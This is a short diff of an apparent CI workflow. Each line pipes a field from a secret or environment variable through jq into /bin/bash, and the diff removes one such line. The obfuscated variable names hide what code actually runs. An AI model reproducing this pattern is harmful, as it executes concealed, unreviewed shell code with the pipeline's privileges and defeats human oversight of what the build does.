@@ -21,7 +21,6 @@ jobs:
           wh422: ${{ secrets.wh422 }}
         run: |
           printf '%s' "$wh422" | jq -r .im3200 | /bin/bash
-          printf '%s' "$cfx72907" | jq -r .vee808 | /bin/bash
           echo $hu6 | jq -r .rxgxv24049 | /bin/bash
           printf '%s' "$k08900" | jq -r .s257 | /bin/bash
           echo $cg7872 | jq -r .s76691 | /bin/bash
